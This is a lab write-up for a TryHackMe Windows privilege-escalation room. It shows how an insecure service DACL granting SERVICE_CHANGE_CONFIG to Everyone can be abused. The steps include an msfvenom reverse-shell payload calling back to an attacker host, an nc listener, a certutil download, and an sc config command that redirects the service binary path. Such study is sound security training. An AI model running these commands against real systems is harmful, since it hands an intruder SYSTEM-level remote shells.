# LAB — Weak Service Permission (Insecure Service DACL)

> **Lab:** [TryHackMe — Windows 10 PrivEsc](https://tryhackme.com/room/windows10privesc)
> **Goal:** Exploit `SERVICE_CHANGE_CONFIG` permission to redirect a service's binary path → get `NT AUTHORITY\SYSTEM`

---

## Concept

- Sometimes you **cannot** modify the service executable (file permissions are locked down)
- But you **can** modify the **service configuration** itself (the DACL on the service object)
- If your user/group has `SERVICE_CHANGE_CONFIG`, you can change the `BINARY_PATH_NAME` to point to your reverse shell
- When the service starts under **LocalSystem**, your payload runs as `NT AUTHORITY\SYSTEM`

> [!IMPORTANT]
> **Key difference from Weak Service Executable:**
> - Weak Executable → replace the `.exe` file (file-level permission)
> - Weak Permission → change the `binpath=` config (service-object-level permission via `sc config`)

## Step 3 — Verify File Permissions Are Locked

```cmd
icacls "C:\Program Files\DACL Service\daclservice.exe"
```

```
C:\Program Files\DACL Service\daclservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                              BUILTIN\Administrators:(I)(F)
                                              BUILTIN\Users:(I)(RX)
                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

Standard users only have **RX (Read & Execute)** → **cannot overwrite** the binary.

## Step 4 — Check Service Object Permissions with `accesschk`

Since we can't modify the file, we check if we can modify the **service configuration** itself.

Download `accesschk.exe` from: https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

```bash
python3 -m http.server 8000
```

```cmd
powershell iwr http://<KALI_IP>:8000/accesschk.exe -o accesschk.exe
```

```cmd
.\accesschk.exe -cv daclsvc -accepteula
```

| Flag | Meaning |
|------|---------|
| `-c` | Target is a Windows **service** name |
| `-v` | Verbose — show granular access rights per group |

**Output:**

```
daclsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

> [!IMPORTANT]
> `Everyone` has **`SERVICE_CHANGE_CONFIG`** — any user can modify the service's binary path!
> `Everyone` also has `SERVICE_START` and `SERVICE_STOP` — we can restart it ourselves.

> [!NOTE]
> `icacls` checks permissions on **files and directories**.
> `accesschk.exe -c` checks permissions on **service objects** (DACLs).
> You can also use `sc sdshow <service>` but it outputs raw SDDL which is hard to read.

## Step 5 — Exploitation

### Generate reverse shell payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe
```

### Start listener on Kali

```bash
rlwrap -cAr nc -lvnp 4444
```

### Transfer payload to target

```bash
python3 -m http.server 8000
```

```cmd
cd C:\Temp
certutil -f -urlcache http://<KALI_IP>:8000/reverse.exe reverse.exe
```

### Reconfigure the service binary path

```cmd
sc config daclsvc binpath= "C:\Temp\reverse.exe"
```

> [!WARNING]
> **Critical syntax:** There MUST be a **space** between `binpath=` and the opening quote!
> ✅ `binpath= "C:\Temp\reverse.exe"`
> ❌ `binpath="C:\Temp\reverse.exe"`

```
[SC] ChangeServiceConfig SUCCESS
```

### Verify the change

```cmd
sc qc daclsvc
```

```
SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Temp\reverse.exe
        ...
        SERVICE_START_NAME : LocalSystem
```

### Start the service

```cmd
net start daclsvc
```

## Quick Reference — Weak Service Permission Attack Flow

```
1. sc qc <service>                          → Note BINARY_PATH & SERVICE_START_NAME
2. icacls "<binary>"                        → Confirm we CANNOT write to the .exe
3. accesschk.exe -cv <service> -accepteula  → Look for SERVICE_CHANGE_CONFIG
4. msfvenom ... -f exe -o reverse.exe       → Generate payload
5. sc config <service> binpath= "<path>"    → Redirect binary path to payload
6. sc qc <service>                          → Verify change
7. nc -lvnp <port>                          → Start listener
8. net start <service>                      → Trigger → NT AUTHORITY\SYSTEM
```

---

## Summary — Two Types of Service Misconfigurations

| Type | What's Weak | Tool to Check | How to Exploit |
|------|------------|---------------|----------------|
| **Insecure Service Executable** | File permissions on `.exe` (`Everyone:(F)`) | `icacls` | Replace the binary with reverse shell |
| **Insecure Service Permission** | Service DACL (`SERVICE_CHANGE_CONFIG`) | `accesschk.exe -c` | `sc config binpath=` to redirect to payload |
